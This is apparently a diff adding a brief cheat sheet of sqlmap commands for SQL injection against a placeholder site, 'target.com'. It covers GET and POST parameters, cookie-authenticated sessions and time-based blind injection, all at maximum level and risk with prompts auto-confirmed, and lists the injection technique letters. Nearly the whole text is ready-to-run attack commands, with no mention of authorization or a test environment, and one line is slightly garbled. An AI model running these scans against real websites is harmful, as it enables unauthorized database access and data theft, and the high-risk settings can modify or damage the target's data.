@@ -1,1 +1,22 @@
+sql map
+sqlmap -u "https://target.com/search.php?q=test" --level=5 --risk=3 --batch
+--level=5: Tests all possible injection points (headers, cookies, etc.)
+--risk=3: Includes time-based and heavy queries
+--batch: Auto-confirm prompts (good for scripting)
 
+if it’s a POST request:
+sqlmap -u "https://target.com/search" --data="q=test" --level=5 --risk=3 --batch
+
+ If login is needed (with cookie):
+sqlmap -u "https://target.com/search?q=test" --cookie="PHPSESSID=xyz" --level=5 --risk=3 --batch
+
+ If you suspect blind/time-based SQLi:
+sqlmap -u "https://target.com/search?q=test" --technique=T --time-sec=5 --level=5 --risk=3 --batch
+
+--technique=BEUST --command is sql 
+To focus specific techniques:
+Boolean-based
+Error-based
+Union-based
+Stacked queries
+Time-based
